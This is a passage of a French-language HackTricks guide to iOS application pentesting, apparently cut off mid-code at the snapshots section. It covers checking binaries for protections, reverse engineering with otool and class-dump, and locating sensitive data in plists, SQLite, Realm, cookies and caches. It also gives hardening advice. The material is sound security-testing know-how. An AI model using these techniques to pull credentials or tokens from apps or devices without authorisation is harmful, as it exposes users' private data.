# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** gr√¢ce aux outils communautaires **les plus avanc√©s**.
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Fondamentaux iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Environnement de Test

Sur cette page, vous trouverez des informations sur **le simulateur iOS**, **les √©mulateurs** et **le jailbreaking** :

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Analyse Initiale

### Op√©rations de Test iOS de Base

Pendant le test, **plusieurs op√©rations seront sugg√©r√©es** (se connecter √† l'appareil, lire/√©crire/t√©l√©charger/d√©poser des fichiers, utiliser certains outils...). Par cons√©quent, si vous ne savez pas comment effectuer l'une de ces actions, veuillez **commencer par lire la page** :

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Pour les √©tapes suivantes, **l'application doit √™tre install√©e** sur l'appareil et vous devriez d√©j√† avoir obtenu le fichier **IPA** de l'application.
Lisez la page [Op√©rations de Test iOS de Base](basic-ios-testing-operations.md) pour apprendre √† faire cela.
{% endhint %}

### Analyse Statique de Base

Il est recommand√© d'utiliser l'outil [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) pour effectuer une Analyse Statique automatique du fichier IPA.

Identification des **protections pr√©sentes dans le binaire** :

*   **PIE (Position Independent Executable)** : Lorsqu'activ√©, l'application se charge √† une adresse m√©moire al√©atoire √† chaque lancement, rendant plus difficile la pr√©diction de son adresse m√©moire initiale.

```bash
otool -hv <app-binary> | grep PIE   # Devrait inclure le drapeau PIE
```
*   **Canaries de Pile** : Pour valider l'int√©grit√© de la pile, une valeur 'canary' est plac√©e sur la pile avant d'appeler une fonction et est √† nouveau valid√©e une fois la fonction termin√©e.

```bash
otool -I -v <app-binary> | grep stack_chk   # Devrait inclure les symboles : stack_chk_guard et stack_chk_fail
```
*   **ARC (Automatic Reference Counting)** : Pour pr√©venir les d√©fauts courants de corruption de m√©moire

```bash
otool -I -v <app-binary> | grep objc_release   # Devrait inclure le symbole _objc_release
```
*   **Binaire Chiffr√©** : Le binaire devrait √™tre chiffr√©

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # Le cryptid devrait √™tre 1
```

**Identification de Fonctions Sensibles/Non S√©curis√©es**

*   **Algorithmes de Hachage Faibles**

```bash
# Sur l'appareil iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Sur linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Fonctions Al√©atoires Non S√©curis√©es**

```bash
# Sur l'appareil iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Sur linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Fonction ‚ÄòMalloc‚Äô Non S√©curis√©e**

```bash
# Sur l'appareil iOS
otool -Iv <app> | grep -w "_malloc"

# Sur linux
grep -iER "_malloc"
```
*   **Fonctions Non S√©curis√©es et Vuln√©rables**

```bash
# Sur l'appareil iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Sur linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Analyse Dynamique de Base

Consultez l'analyse dynamique que [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) effectue. Vous devrez naviguer √† travers les diff√©rentes vues et interagir avec elles, mais cela impliquera de crocheter plusieurs classes en faisant d'autres choses et pr√©parera un rapport une fois que vous aurez termin√©.

### Liste des Applications Install√©es

Lorsque vous ciblez des applications install√©es sur l'appareil, vous devrez d'abord d√©terminer le bon identifiant de bundle de l'application que vous souhaitez analyser. Vous pouvez utiliser `frida-ps -Uai` pour obtenir toutes les applications (`-a`) actuellement install√©es (`-i`) sur l'appareil USB connect√© (`-U`) :
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### √ânum√©ration de base et Hooking

Apprenez comment **√©num√©rer les composants de l'application** et comment **intercepter facilement des m√©thodes et des classes** avec objection :

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Structure IPA

Les fichiers `.ipa` sont des **paquets compress√©s**, donc vous pouvez changer l'extension en `.zip` et les **d√©compresser**. Une application **compl√®tement empaquet√©e** pr√™te √† √™tre install√©e est commun√©ment appel√©e un **Bundle**.\
Apr√®s les avoir d√©compress√©s, vous devriez voir `<NAME>.app`, une archive compress√©e qui contient le reste des ressources.

* `Info.plist` : Un fichier qui contient certaines des configurations sp√©cifiques de l'application.
* `_CodeSignature/` contient un fichier plist avec une signature sur tous les fichiers du bundle.
* `Assets.car` : Une autre archive compress√©e qui contient des actifs (ic√¥nes).
* `Frameworks/` contient les biblioth√®ques natives de l'application sous forme de fichiers .dylib ou .framework.
* `PlugIns/` peut contenir des extensions d'application sous forme de fichiers .appex (non pr√©sents dans l'exemple).
* [`Core Data`](https://developer.apple.com/documentation/coredata) : Utilis√© pour sauvegarder les donn√©es permanentes de votre application pour une utilisation hors ligne, pour mettre en cache des donn√©es temporaires, et pour ajouter une fonctionnalit√© d'annulation √† votre application sur un seul appareil. Pour synchroniser les donn√©es sur plusieurs appareils dans un seul compte iCloud, Core Data refl√®te automatiquement votre sch√©ma dans un conteneur CloudKit.
* [`PkgInfo`](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html) : Le fichier `PkgInfo` est une autre mani√®re de sp√©cifier les codes de type et de cr√©ateur de votre application ou bundle.
* **en.lproj, fr.proj, Base.lproj** : Sont les packs de langue qui contiennent des ressources pour ces langues sp√©cifiques, et une ressource par d√©faut en cas de langue non prise en charge.

Il existe plusieurs mani√®res de d√©finir l'UI dans une application iOS : fichiers _storyboard_, _nib_ ou _xib_.

**Info.plist**

La liste des propri√©t√©s d'information ou `Info.plist` est la principale source d'information pour une application iOS. Il s'agit d'un fichier structur√© contenant des paires **cl√©-valeur** d√©crivant des informations de configuration essentielles sur l'application. En fait, tous les ex√©cutables group√©s (extensions d'application, frameworks et applications) sont **cens√©s avoir** un fichier `Info.plist`. Vous pouvez trouver toutes les cl√©s possibles dans la [**Documentation pour les d√©veloppeurs Apple**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

Le fichier peut √™tre format√© en **XML ou binaire (bplist)**. Vous pouvez **le convertir au format XML** avec une simple commande :

*   Sur macOS avec `plutil`, qui est un outil fourni nativement avec macOS 10.2 et les versions ult√©rieures (aucune documentation en ligne officielle n'est actuellement disponible) :

```bash
$ plutil -convert xml1 Info.plist
```
*   Sur Linux :

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

Voici une liste non exhaustive de certaines informations et des mots-cl√©s correspondants que vous pouvez facilement rechercher dans le fichier `Info.plist` en inspectant simplement le fichier ou en utilisant `grep -i <mot-cl√©> Info.plist` :

* Cha√Ænes de description des permissions de l'application : `UsageDescription`
* Sch√©mas d'URL personnalis√©s : `CFBundleURLTypes`
* Types de documents personnalis√©s export√©s/import√©s : `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`
* Configuration de la s√©curit√© du transport d'application (ATS) : `NSAppTransportSecurity`

Veuillez vous r√©f√©rer aux chapitres mentionn√©s pour en savoir plus sur la mani√®re de tester chacun de ces points.

**Chemins de donn√©es**

Sur iOS, **les applications syst√®me se trouvent dans le r√©pertoire `/Applications`** tandis que les applications **install√©es par l'utilisateur** sont disponibles sous **`/private/var/containers/`**. Cependant, trouver le bon dossier juste en naviguant dans le syst√®me de fichiers n'est pas une t√¢che triviale car **chaque application re√ßoit un UUID al√©atoire de 128 bits** (Identifiant Unique Universel) attribu√© pour les noms de ses r√©pertoires.

Pour obtenir facilement les informations du r√©pertoire d'installation des applications install√©es par l'utilisateur, vous pouvez utiliser **la commande `env` d'objection** qui vous montrera √©galement toutes les informations de r√©pertoire de l'application :
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Vous pouvez √©galement rechercher le nom de l'application dans **`/private/var/containers`** :
```bash
find /private/var/containers -name "Progname*"
```
Ou en utilisant **`ps`** et **`lsof`** :
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
Comme vous pouvez le voir, les applications ont deux emplacements principaux :

* Le **r√©pertoire Bundle** (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/`).
* Le **r√©pertoire des donn√©es** (`/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/`).

Ces dossiers contiennent des informations qui doivent √™tre examin√©es attentivement lors des √©valuations de s√©curit√© des applications (par exemple lors de l'analyse des donn√©es stock√©es pour des donn√©es sensibles).

**R√©pertoire Bundle :**

* **AppName.app**
* Il s'agit du Bundle d'application comme vu pr√©c√©demment dans l'IPA, il contient des donn√©es essentielles de l'application, du contenu statique ainsi que le binaire compil√© de l'application.
* Ce r√©pertoire est visible par les utilisateurs, mais **les utilisateurs ne peuvent pas √©crire dedans**.
* Le contenu de ce r√©pertoire **n'est pas sauvegard√©**.
* Le contenu de ce dossier est utilis√© pour **valider la signature du code**.

**R√©pertoire des donn√©es :**

* **Documents/**
* Contient toutes les donn√©es g√©n√©r√©es par l'utilisateur. L'utilisateur final de l'application initie la cr√©ation de ces donn√©es.
* Visible par les utilisateurs et **les utilisateurs peuvent √©crire dedans**.
* Le contenu de ce r√©pertoire est **sauvegard√©**.
* L'application peut d√©sactiver des chemins en d√©finissant `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Contient tous **les fichiers qui ne sont pas sp√©cifiques √† l'utilisateur**, tels que **les caches**, **les pr√©f√©rences**, **les cookies**, et les fichiers de configuration de liste de propri√©t√©s (plist).
* Les applications iOS utilisent g√©n√©ralement les sous-r√©pertoires `Application Support` et `Caches`, mais l'application peut cr√©er des sous-r√©pertoires personnalis√©s.
* **Library/Caches/**
* Contient **des fichiers mis en cache semi-persistants.**
* Invisible pour les utilisateurs et **les utilisateurs ne peuvent pas √©crire dedans**.
* Le contenu de ce r√©pertoire **n'est pas sauvegard√©**.
* Le syst√®me d'exploitation peut supprimer automatiquement les fichiers de ce r√©pertoire lorsque l'application n'est pas en cours d'ex√©cution et que l'espace de stockage est faible.
* **Library/Application Support/**
* Contient **des fichiers persistants** n√©cessaires au fonctionnement de l'application.
* **Invisible** **aux** **utilisateurs** et les utilisateurs ne peuvent pas √©crire dedans.
* Le contenu de ce r√©pertoire est **sauvegard√©**.
* L'application peut d√©sactiver des chemins en d√©finissant `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Utilis√© pour stocker des propri√©t√©s qui peuvent **persister m√™me apr√®s le red√©marrage d'une application**.
* Les informations sont sauvegard√©es, non chiffr√©es, √† l'int√©rieur du sandbox de l'application dans un fichier plist appel√© \[BUNDLE\_ID].plist.
* Toutes les paires cl√©/valeur stock√©es en utilisant `NSUserDefaults` peuvent √™tre trouv√©es dans ce fichier.
* **tmp/**
* Utilisez ce r√©pertoire pour √©crire **des fichiers temporaires** qui n'ont pas besoin de persister entre les lancements de l'application.
* Contient des fichiers mis en cache non persistants.
* **Invisible** aux utilisateurs.
* Le contenu de ce r√©pertoire n'est pas sauvegard√©.
* Le syst√®me d'exploitation peut supprimer automatiquement les fichiers de ce r√©pertoire lorsque l'application n'est pas en cours d'ex√©cution et que l'espace de stockage est faible.

Examinons de plus pr√®s le r√©pertoire Bundle de l'application iGoat-Swift (.app) √† l'int√©rieur du r√©pertoire Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`) :
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Inversion de Binaire

Dans le dossier `<application-name>.app`, vous trouverez un fichier binaire appel√© `<application-name>`. C'est le fichier qui sera **ex√©cut√©**. Vous pouvez effectuer une inspection de base du binaire avec l'outil **`otool`** :
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**V√©rifiez si l'application est chiffr√©e**

Regardez s'il y a une sortie pour :
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**D√©sassemblage du binaire**

D√©sassemblez la section de texte :
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Pour imprimer le **segment Objective-C** de l'application exemple, on peut utiliser :
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Afin d'obtenir un code Objective-C plus compact, vous pouvez utiliser [**class-dump**](http://stevenygard.com/projects/class-dump/) :
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Cependant, les meilleures options pour d√©sassembler le binaire sont : [**Hopper**](https://www.hopperapp.com/download.html?) et [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** facilement, aliment√©s par les outils communautaires **les plus avanc√©s**.
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Stockage de donn√©es

Pour en savoir plus sur la mani√®re dont iOS stocke les donn√©es sur l'appareil, lisez cette page :

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Les emplacements suivants pour stocker des informations doivent √™tre v√©rifi√©s **juste apr√®s l'installation de l'application**, **apr√®s avoir v√©rifi√© toutes les fonctionnalit√©s** de l'application et m√™me apr√®s **s'√™tre d√©connect√© d'un utilisateur et connect√© √† un autre**.
L'objectif est de trouver des **informations sensibles non prot√©g√©es** de l'application (mots de passe, jetons), de l'utilisateur actuel et des utilisateurs pr√©c√©demment connect√©s.
{% endhint %}

### Plist

Les fichiers **plist** sont des fichiers XML structur√©s qui **contiennent des paires cl√©-valeur**. C'est une mani√®re de stocker des donn√©es persistantes, donc parfois vous pouvez trouver **des informations sensibles dans ces fichiers**. Il est recommand√© de v√©rifier ces fichiers apr√®s avoir install√© l'application et apr√®s l'avoir utilis√©e intensivement pour voir si de nouvelles donn√©es sont √©crites.

La mani√®re la plus courante de persister les donn√©es dans les fichiers plist est via l'utilisation de **NSUserDefaults**. Ce fichier plist est sauvegard√© √† l'int√©rieur du bac √† sable de l'application dans **`Library/Preferences/<appBundleID>.plist`**

La classe [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) fournit une interface programmatique pour interagir avec le syst√®me par d√©faut. Le syst√®me par d√©faut permet √† une application de personnaliser son comportement selon les **pr√©f√©rences de l'utilisateur**. Les donn√©es sauvegard√©es par `NSUserDefaults` peuvent √™tre consult√©es dans le paquet de l'application. Cette classe stocke les **donn√©es** dans un fichier **plist**, mais elle est destin√©e √† √™tre utilis√©e avec de petites quantit√©s de donn√©es.

Ces donn√©es ne peuvent plus √™tre directement accessibles via un ordinateur de confiance, mais peuvent √™tre accessibles en effectuant une **sauvegarde**.

Vous pouvez **extraire** les informations sauvegard√©es en utilisant `NSUserDefaults` avec la commande `ios nsuserdefaults get` d'objection.

Pour trouver tous les plist utilis√©s par l'application, vous pouvez acc√©der √† `/private/var/mobile/Containers/Data/Application/{APPID}` et ex√©cuter :
```bash
find ./ -name "*.plist"
```
Le fichier peut √™tre format√© en **XML ou binaire (bplist)**. Vous pouvez **le convertir en format XML** avec une simple commande :

*   Sur macOS avec `plutil`, qui est un outil fourni nativement avec les versions macOS 10.2 et sup√©rieures (aucune documentation officielle en ligne n'est actuellement disponible) :

```bash
$ plutil -convert xml1 Info.plist
```
*   Sur Linux :

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
*   Lors d'une session objection :

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) est un framework pour g√©rer la couche mod√®le d'objets dans votre application. [Core Data peut utiliser SQLite comme son stockage persistant](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), mais le framework en lui-m√™me n'est pas une base de donn√©es.\
CoreData ne chiffre pas ses donn√©es par d√©faut. Cependant, une couche de chiffrement suppl√©mentaire peut √™tre ajout√©e √† CoreData. Voir le [d√©p√¥t GitHub](https://github.com/project-imas/encrypted-core-data) pour plus de d√©tails.

Vous pouvez trouver les informations SQLite Core Data d'une application dans le chemin `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Si vous pouvez ouvrir le SQLite et acc√©der √† des informations sensibles, alors vous avez trouv√© une mauvaise configuration.**

{% code title="Code de iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) est un magasin de cl√©s/valeurs construit sur SQLite.\
Comme les bases de donn√©es Yap sont des bases de donn√©es sqlite, vous pouvez les trouver en utilisant la commande sugg√©r√©e dans la section pr√©c√©dente.

### Autres bases de donn√©es SQLite

Il est courant que les applications cr√©ent leur propre base de donn√©es sqlite. Elles peuvent **stocker** des **donn√©es sensibles** et les laisser non chiffr√©es. Par cons√©quent, il est toujours int√©ressant de v√©rifier chaque base de donn√©es dans le r√©pertoire des applications. Allez donc dans le r√©pertoire de l'application o√π les donn√©es sont sauvegard√©es (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Bases de donn√©es Firebase en temps r√©el

Elles peuvent √™tre utilis√©es par les d√©veloppeurs d'applications pour **stocker et synchroniser des donn√©es avec une base de donn√©es h√©berg√©e dans le cloud NoSQL**. Les donn√©es sont stock√©es au format JSON et sont synchronis√©es en temps r√©el avec chaque client connect√© et restent √©galement disponibles m√™me lorsque l'application est hors ligne.

Vous pouvez trouver comment v√©rifier les bases de donn√©es Firebase mal configur√©es ici :

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Bases de donn√©es Realm

[Realm Objective-C](https://realm.io/docs/objc/latest/) et [Realm Swift](https://realm.io/docs/swift/latest/) ne sont pas fournis par Apple, mais ils m√©ritent tout de m√™me d'√™tre mentionn√©s. Ils **stockent tout en clair, √† moins que la configuration ne soit activ√©e pour le chiffrement**.

Vous pouvez trouver ces bases de donn√©es dans `/private/var/mobile/Containers/Data/Application/{APPID}`
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Vous pouvez utiliser l'outil [**Realm Studio**](https://github.com/realm/realm-studio) pour ouvrir ces fichiers de base de donn√©es.

L'exemple suivant d√©montre comment utiliser le chiffrement avec une base de donn√©es Realm :
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bases de donn√©es Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) est un moteur de base de donn√©es l√©ger, embarqu√© et orient√© document (NoSQL) qui peut √™tre synchronis√©. Il est compil√© nativement pour iOS et macOS.

V√©rifiez les √©ventuelles bases de donn√©es couchbase dans `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/`

### Cookies

iOS stocke les cookies des applications dans le fichier **`Library/Cookies/cookies.binarycookies`** √† l'int√©rieur du dossier de chaque application. Cependant, les d√©veloppeurs d√©cident parfois de les sauvegarder dans le **trousseau** car le fichier de cookies mentionn√© **peut √™tre acc√©d√© dans les sauvegardes**.

Pour inspecter le fichier des cookies, vous pouvez utiliser [**ce script python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ou utiliser la commande d'objection **`ios cookies get`.**\
**Vous pouvez √©galement utiliser objection pour** convertir ces fichiers au format JSON et inspecter les donn√©es.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

Par d√©faut, NSURLSession stocke des donn√©es, telles que les **requ√™tes et r√©ponses HTTP dans la base de donn√©es Cache.db**. Cette base de donn√©es peut contenir des **donn√©es sensibles**, si des jetons, noms d'utilisateur ou toute autre information sensible ont √©t√© mis en cache. Pour trouver les informations mises en cache, ouvrez le r√©pertoire de donn√©es de l'application (`/var/mobile/Containers/Data/Application/<UUID>`) et allez dans `/Library/Caches/<Bundle Identifier>`. Le **cache WebKit est √©galement stock√© dans le fichier Cache.db**. **Objection** peut ouvrir et interagir avec la base de donn√©es avec la commande `sqlite connect Cache.db`, car c'est une **base de donn√©es SQLite normale**.

Il est **recommand√© de d√©sactiver la mise en cache de ces donn√©es**, car elles peuvent contenir des informations sensibles dans la requ√™te ou la r√©ponse. La liste suivante montre diff√©rentes mani√®res de r√©aliser cela :

1. Il est recommand√© de supprimer les r√©ponses mises en cache apr√®s la d√©connexion. Cela peut √™tre fait avec la m√©thode fournie par Apple appel√©e [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Vous pouvez appeler cette m√©thode comme suit :

`URLCache.shared.removeAllCachedResponses()`

Cette m√©thode supprimera toutes les requ√™tes et r√©ponses mises en cache du fichier Cache.db.
2. Si vous n'avez pas besoin d'utiliser l'avantage des cookies, il serait recommand√© d'utiliser simplement la propri√©t√© de configuration [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) de URLSession, qui d√©sactivera l'enregistrement des cookies et des caches.

[Documentation Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) :

`Un objet de configuration de session √©ph√©m√®re est similaire √† une configuration de session par d√©faut (voir default), sauf que l'objet de session correspondant ne stocke pas de caches, de magasins de certificats ou de donn√©es li√©es √† la session sur le disque. Au lieu de cela, les donn√©es li√©es √† la session sont stock√©es en RAM. La seule fois o√π une session √©ph√©m√®re √©crit des donn√©es sur le disque est lorsque vous lui demandez d'√©crire le contenu d'une URL dans un fichier.`
3. Le cache peut √©galement √™tre d√©sactiv√© en d√©finissant la politique de cache √† [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Cela d√©sactivera le stockage du cache de quelque mani√®re que ce soit, que ce soit en m√©moire ou sur disque.

### Instantan√©s

Chaque fois que vous appuyez sur le bouton d'accueil, iOS **prend un instantan√© de l'√©cran actuel** pour pouvoir faire la transition vers l'application de mani√®re beaucoup plus fluide. Cependant, si des **donn√©es sensibles** sont pr√©sentes sur l'√©cran actuel, elles seront **sauvegard√©es** dans l'**image** (qui **persiste** **apr√®s** **red√©marrage**). Ce sont les instantan√©s auxquels vous pouvez √©galement acc√©der en appuyant deux fois sur le bouton d'accueil pour basculer entre les applications.

√Ä moins que l'iPhone ne soit jailbreak√©, l'**attaquant** a besoin d'avoir **acc√®s** au **p√©riph√©rique** **d√©bloqu√©** pour voir ces captures d'√©cran. Par d√©faut, le dernier instantan√© est stock√© dans le bac √† sable de l'application dans le dossier `Library/Caches/Snapshots/` ou `Library/SplashBoard/Snapshots` (les ordinateurs de confiance ne peuvent pas acc√©der au syst√®me de fichiers √† partir d'iOS 7.0).

Une fa√ßon d'emp√™cher ce mauvais comportement est de placer un √©cran vide ou de supprimer les donn√©es sensibles avant de prendre l'instantan√© en utilisant la fonction `ApplicationDidEnterBackground()`.

Voici une m√©thode de correction d'exemple qui d√©finira une capture d'√©cran par d√©faut.

Swift :
```swift
private var backgroundImage: UIImageView?

